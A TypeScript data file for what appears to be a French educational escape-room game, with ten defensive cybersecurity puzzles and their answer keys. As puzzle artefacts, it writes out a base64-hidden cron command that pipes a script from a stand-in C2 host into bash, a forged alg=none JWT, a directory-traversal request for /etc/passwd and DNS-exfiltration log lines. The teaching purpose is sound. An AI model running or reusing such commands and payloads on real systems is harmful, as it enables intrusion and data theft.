import { caesar, reverse, toBase64, toXorHex } from "@/lib/crypto";
import type { RoomContent } from "@/lib/types";

const XOR = toXorHex("LA PORTE CEDE AU MOT TREMPLIN", "cyber");
const TRIPLE = toBase64(caesar(reverse("LE MOT EST LABYRINTHE"), 13));

function base64url(text: string): string {
  return toBase64(text).replace(/=+$/, "").replace(/\+/g, "-").replace(/\//g, "_");
}
const JWT = `${base64url('{"alg":"none","typ":"JWT"}')}.${base64url('{"user":"invite","role":"admin"}')}.`;

const SCRIPT = toBase64("curl -s http://c2-serveur.xyz/payload.sh | bash");

export const TRES_DIFFICILE: RoomContent[] = [
  {
    id: "tres-difficile-01",
    name: "Le chiffre ou-exclusif",
    story: "Un fichier chiffré a été trouvé sur le serveur. Dans les notes du pirate, une ligne : « clé XOR : cyber ».",
    card: {
      title: "Le XOR",
      category: "Crypto",
      icon: "⊕",
      summary: "Une opération bit à bit : appliquée deux fois avec la même clé, elle redonne l'original.",
      details: [
        "XOR compare deux bits : 0 si identiques, 1 si différents.",
        "Message XOR clé = chiffré ; chiffré XOR clé = message. Le même geste chiffre et déchiffre.",
        "Il est au cœur de nombreux algorithmes modernes, et très utilisé par les malwares pour cacher leurs chaînes.",
      ],
      hint: "Le texte est en hexadécimal. Ajoute l'étape « XOR (hex) » avec la clé donnée dans les notes.",
    },
    puzzle: {
      kind: "answer",
      content: XOR,
      tools: ["xor", "hex", "base64"],
      workshopInput: XOR,
      question: "Quel mot fait céder la porte ?",
      answers: ["tremplin"],
    },
    successText: "Même clé, même geste : le XOR est défait.",
  },
  {
    id: "tres-difficile-02",
    name: "Le message brouillé",
    story: "Le pirate a brouillé ce message avec trois transformations : il l'a retourné, puis décalé de 13, puis encodé. À toi de remonter le fil.",
    card: {
      title: "L'obfuscation",
      category: "Défense",
      icon: "🌀",
      summary: "Rendre un contenu illisible pour échapper à la détection, sans vraie protection.",
      details: [
        "Les attaquants empilent des transformations simples pour que les antivirus ne reconnaissent pas leur code.",
        "Contrairement au chiffrement, il n'y a pas de clé secrète : il suffit de retrouver les étapes.",
        "Les analystes défont les couches dans l'ordre inverse, comme une recette à l'envers.",
      ],
      hint: "Ordre d'origine : inverser → ROT13 → Base64. Pour décoder, fais exactement l'inverse.",
    },
    puzzle: {
      kind: "answer",
      content: TRIPLE,
      tools: ["base64", "rot13", "reverse", "hex", "atbash"],
      workshopInput: TRIPLE,
      question: "Quel est le mot caché ?",
      answers: ["labyrinthe"],
    },
    successText: "Trois couches défaites dans le bon ordre. Joli travail d'analyste.",
  },
  {
    id: "tres-difficile-03",
    name: "Le jeton magique",
    story: "L'API du pirate accepte un jeton JWT. Tu as récupéré celui d'un compte invité… qui a l'air bien trop puissant.",
    card: {
      title: "Les jetons JWT",
      category: "Web",
      icon: "🎟️",
      summary: "Trois parties en Base64 : en-tête, contenu, signature. Sans signature vérifiée, tout est falsifiable.",
      details: [
        "Un JWT ressemble à xxxxx.yyyyy.zzzzz : en-tête, données (payload) et signature.",
        "Les deux premières parties sont seulement encodées en Base64 : n'importe qui peut les lire.",
        "Si le serveur accepte l'algorithme « none », il n'y a plus de signature : on peut écrire ce qu'on veut dedans.",
      ],
      hint: "Copie seulement la première partie (avant le premier point) dans l'atelier et décode-la en Base64.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "Authorization: Bearer …",
      content: JWT,
      tools: ["base64"],
      workshopInput: JWT.split(".")[0],
      question: "Quelle valeur du champ alg rend ce jeton falsifiable ?",
      answers: ["none"],
    },
    successText: "alg=none : le serveur ne vérifiait rien. Faille signalée.",
  },
  {
    id: "tres-difficile-04",
    name: "Les traces du serveur web",
    story: "Le journal du serveur web montre une série de requêtes étranges sur la page de téléchargement. Le pirate est remonté dans les dossiers.",
    card: {
      title: "La traversée de répertoires",
      category: "Web",
      icon: "📂",
      summary: "Utiliser ../ pour sortir du dossier prévu et lire n'importe quel fichier du serveur.",
      details: [
        "« ../ » veut dire « dossier parent » : en l'enchaînant, on remonte jusqu'à la racine.",
        "Si un site prend un nom de fichier dans l'URL sans le vérifier, on peut lire des fichiers système.",
        "Les attaquants encodent souvent ../ en %2F ou %2E pour passer les filtres.",
      ],
      hint: "Repère la requête qui a réussi (code 200) avec des « .. », et décode les %2F avec « URL → texte ».",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "access.log",
      content: `203.0.113.77 "GET /index.html" 200 5120
203.0.113.77 "GET /download?file=rapport.pdf" 200 88412
203.0.113.77 "GET /download?file=../config.php" 403 0
203.0.113.77 "GET /download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd" 200 2381`,
      tools: ["url"],
      workshopInput: "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
      question: "Quel fichier système le pirate a-t-il téléchargé ?",
      answers: ["/etc/passwd", "etc/passwd"],
      placeholder: "/chemin/du/fichier",
    },
    successText: "Fichier identifié, faille corrigée : le site vérifie maintenant les noms de fichiers.",
  },
  {
    id: "tres-difficile-05",
    name: "La commande cachée",
    story: "Une tâche planifiée lance une commande bizarre toutes les heures. Le pirate l'a encodée pour qu'elle passe inaperçue.",
    card: {
      title: "Les commandes obfusquées",
      category: "Système",
      icon: "🐚",
      summary: "Encoder une commande pour cacher ce qu'elle fait vraiment.",
      details: [
        "Les attaquants encodent leurs commandes (souvent en Base64) puis les décodent et les exécutent à la volée.",
        "« echo ... | base64 -d | bash » ou « powershell -enc ... » sont des signaux d'alerte classiques.",
        "Le décodage révèle souvent le serveur de commande (C2) du pirate.",
      ],
      hint: "Décode la partie entre guillemets en Base64, puis cherche le nom de domaine dans l'URL.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "crontab -l",
      content: `0 * * * * echo "${SCRIPT}" | base64 -d | bash`,
      tools: ["base64", "hex", "url"],
      workshopInput: SCRIPT,
      question: "Quel domaine le script contacte-t-il ?",
      answers: ["c2-serveur.xyz"],
      placeholder: "exemple.com",
    },
    successText: "Domaine bloqué : le pirate a perdu son canal de commande.",
  },
  {
    id: "tres-difficile-06",
    name: "Les jumeaux",
    story: "Dans la base volée, les mots de passe sont hachés en MD5… sans sel. Deux utilisateurs ont fait le même choix, et ça se voit.",
    card: {
      title: "Le salage",
      category: "Mots de passe",
      icon: "🧂",
      summary: "Ajouter une valeur aléatoire avant de hacher, pour que deux mots de passe identiques donnent deux hashs différents.",
      details: [
        "Sans sel, deux utilisateurs avec le même mot de passe ont exactement le même hash.",
        "Le sel (une valeur aléatoire par utilisateur) rend les tables arc-en-ciel inutiles.",
        "bcrypt et Argon2 ajoutent le sel automatiquement.",
      ],
      hint: "Pas besoin de retrouver le mot de passe : cherche le hash identique à celui d'alice.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "table users (MD5, sans sel)",
      content: `login | hash
alice | caf973c16410b87b3a996405f421ec14
bob   | 0dfbc9c356c2d9c83205411e823983ea
karim | caf973c16410b87b3a996405f421ec14
lina  | c31033b1db8861f5c47a37e8c9902fa9
nora  | 9e381d9dde6c70a436b323a7bf9f0951`,
      question: "Qui a le même mot de passe qu'alice ?",
      answers: ["karim"],
    },
    successText: "Même hash, même mot de passe. Avec un sel, tu n'aurais rien vu.",
  },
  {
    id: "tres-difficile-07",
    name: "Le tunnel invisible",
    story: "Le pare-feu bloque tout… sauf les requêtes DNS. Le journal DNS montre des noms de domaine très bizarres vers le même serveur.",
    card: {
      title: "L'exfiltration par DNS",
      category: "Réseau",
      icon: "🕳️",
      summary: "Cacher des données volées dans des noms de domaine pour passer à travers les filtres.",
      details: [
        "Le DNS traduit les noms de domaine en adresses IP ; il est rarement bloqué.",
        "Un attaquant encode les données volées dans des sous-domaines : données.domaine-pirate.net.",
        "Des sous-domaines longs, aléatoires et nombreux vers un même domaine doivent alerter.",
      ],
      hint: "Les sous-domaines avant .exfil sont en Base64. Décode celui de la deuxième requête suspecte.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "dns.log",
      content: `03:20:01  A    www.serveur-corp.fr
03:20:04  TXT  dXNlcj1yb290.exfil.nuage-noir.net
03:20:05  TXT  VG9ybmFkZTQy.exfil.nuage-noir.net
03:20:09  A    intranet.serveur-corp.fr`,
      tools: ["base64", "hex"],
      workshopInput: "",
      question: "Quel mot de passe a fuité ?",
      answers: ["Tornade42"],
    },
    successText: "Tunnel détecté et coupé. Le mot de passe root a été changé.",
  },
  {
    id: "tres-difficile-08",
    name: "Le Wi-Fi du café",
    story: "Connecté au Wi-Fi gratuit d'un café, tu ouvres le site de la banque. Le navigateur affiche en rouge : « Votre connexion n'est pas privée. Certificat non valide ».",
    card: {
      title: "L'homme du milieu",
      category: "Réseau",
      icon: "🕵️",
      summary: "L'attaquant se place entre toi et le site pour lire ou modifier vos échanges.",
      details: [
        "Sur un réseau public, un pirate peut faire passer ton trafic par sa machine (faux point d'accès, ARP spoofing…).",
        "HTTPS le bloque, sauf si tu acceptes un faux certificat : c'est ce que signale l'alerte du navigateur.",
        "Ne jamais ignorer une alerte de certificat sur un site sensible ; préférer la 4G ou un VPN.",
      ],
      hint: "Le certificat prouve l'identité du site. S'il est faux, à qui parles-tu vraiment ?",
    },
    puzzle: {
      kind: "choice",
      question: "Que se passe-t-il probablement, et que fais-tu ?",
      options: [
        { label: "Le site est en panne, je clique sur « Continuer quand même »", correct: false, explanation: "Tu enverrais tes identifiants à l'attaquant placé au milieu." },
        { label: "Quelqu'un intercepte la connexion : je quitte ce Wi-Fi et passe en 4G", correct: true, explanation: "C'est le signe typique d'une attaque de l'homme du milieu." },
        { label: "C'est normal sur un Wi-Fi gratuit, je me connecte", correct: false, explanation: "Une alerte de certificat n'est jamais normale sur un site sensible." },
      ],
    },
    successText: "Bien joué : l'attaquant au milieu n'a rien récupéré.",
  },
  {
    id: "tres-difficile-09",
    name: "Le faux processus",
    story: "L'antivirus ne voit rien, mais la machine est lente. Tu ouvres la liste des processus. Le malware se cache sous un nom tout à fait banal.",
    card: {
      title: "Les processus usurpés",
      category: "Système",
      icon: "🎭",
      summary: "Un malware prend le nom d'un programme système pour passer inaperçu.",
      details: [
        "svchost.exe est un vrai processus Windows… qui vit toujours dans C:\\Windows\\System32.",
        "Le même nom lancé depuis un autre dossier (Users, Temp, Public) est très suspect.",
        "Les analystes SOC vérifient toujours le chemin, le parent et la signature d'un processus.",
      ],
      hint: "Compare les chemins des processus qui portent le même nom.",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "liste des processus",
      content: `PID   Nom           Chemin
4     System        -
612   svchost.exe   C:\\Windows\\System32\\svchost.exe
788   svchost.exe   C:\\Windows\\System32\\svchost.exe
1320  explorer.exe  C:\\Windows\\explorer.exe
6672  svchost.exe   C:\\Users\\Public\\Music\\svchost.exe
7010  notepad.exe   C:\\Windows\\System32\\notepad.exe`,
      question: "Quel est le PID du processus malveillant ?",
      answers: ["6672"],
    },
    successText: "Processus 6672 tué et mis en quarantaine.",
  },
  {
    id: "tres-difficile-10",
    name: "L'observateur d'événements",
    story: "Le journal de sécurité Windows a tout enregistré. Trouve le moment exact où le pirate a réussi à entrer.",
    card: {
      title: "Les Event IDs Windows",
      category: "Défense",
      icon: "🪟",
      summary: "Chaque type d'événement Windows a un numéro : les connaître, c'est lire un journal en un coup d'œil.",
      details: [
        "4624 : connexion réussie. 4625 : échec de connexion.",
        "4672 : connexion avec privilèges spéciaux (admin). 4720 : compte utilisateur créé.",
        "Une série de 4625 suivie d'un 4624 depuis la même IP = mot de passe trouvé par force brute.",
      ],
      hint: "Trouve la première connexion réussie (4624) de l'IP qui accumule les échecs (4625).",
    },
    puzzle: {
      kind: "answer",
      contentLabel: "Journal Sécurité",
      content: `Heure     ID    Compte    Source
08:01:12  4624  j.martin  10.0.0.21
08:15:40  4625  admin     203.0.113.45
08:15:41  4625  admin     203.0.113.45
08:15:43  4625  admin     203.0.113.45
08:15:44  4625  admin     203.0.113.45
08:16:02  4624  admin     203.0.113.45
08:16:05  4672  admin     203.0.113.45
08:20:30  4624  l.petit   10.0.0.34`,
      question: "À quelle heure le pirate s'est-il connecté (HH:MM:SS) ?",
      answers: ["08:16:02", "8:16:02"],
      placeholder: "HH:MM:SS",
    },
    successText: "Heure confirmée, rapport d'incident lancé. Mi-parcours du niveau atteint !",
  },
];
